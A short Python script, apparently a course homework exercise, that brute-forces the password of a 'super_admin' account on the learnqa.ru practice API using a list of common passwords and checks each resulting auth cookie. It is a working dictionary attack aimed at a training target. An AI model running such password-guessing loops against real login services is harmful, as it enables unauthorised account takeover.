import requests

url1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"
passwords = [
    "!@#$%^&*","000000","111111","121212","123123","1234","12345","123456","1234567","12345678","123456789",
    "1234567890","123qwe","1q2w3e4r","1qaz2wsx","654321","666666","7777777","888888","aa123456","abc123","access",
    "admin","adobe123","ashley","azerty","bailey","baseball","batman","charlie","dragon","donald","freedom",
    "football","hello","hottie","iloveyou","jesus","letmein","login","lovely","loveme","master","michael","monkey",
    "mustang","ninja","passw0rd","password","password1","photoshop","princess","qazwsx","qwerty","qwerty123",
    "qwertyuiop","shadow","solo","starwars","sunshine","superman","trustno1","welcome","whatever","zaq1zaq1"]

for password in passwords:
    response1 = requests.post(url1, data={"login": login, "password": password})
    cookie_value = response1.cookies["auth_cookie"]
    cookies = {}
    if cookie_value is not None:
        cookies.update({"auth_cookie": cookie_value})
    response2 = requests.post(url2, cookies=cookies)
    if response2.text != "You are NOT authorized":
        print(f"Правильный пароль: {password}")
        print(response2.text)
        break
